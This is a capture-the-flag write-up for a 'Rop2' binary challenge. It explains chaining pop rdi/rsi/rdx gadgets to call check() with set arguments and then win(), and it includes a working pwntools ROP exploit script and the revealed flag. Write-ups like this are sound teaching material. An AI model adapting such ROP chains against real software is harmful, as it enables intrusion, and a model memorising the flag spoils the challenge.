# Rop2

[ROP gadgets](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming) allow you to control function arguments. Can you get the flag?

## Solution

The source code provides us with some nice gadgets (`pop rdi`, `pop rsi`, `pop rdx`). These can be used to force the binary to call `check()` and `win()`. For `win` to work, `good` needs to be set to `1`. To set `good` to the correct value, `check` must be called with the correct parameters. It is possible to set the parameters by using the `rdi`, `rsi`, and `rdx` gadgets. The script I used to perform this attack is as follows.

```python
from pwn import *

#p = process('./rop2')
p = remote('127.0.0.1', 1339)

pop_rdi = p64(0x4011c9)
pop_rsi = p64(0x4011cb)
pop_rdx = p64(0x4011cd)
check = p64(0x401233)
win = p64(0x4011d2)

payload = b'A' * 16 + pop_rdi + p64(1) + pop_rsi + p64(2) + pop_rdx + p64(3) + check + win

p.recvuntil(b'\n')
p.sendline(payload)
print(p.readuntil(b'\n\n').decode('utf-8'))
```

flag:
`gigem{infinite_ret_ftw}`
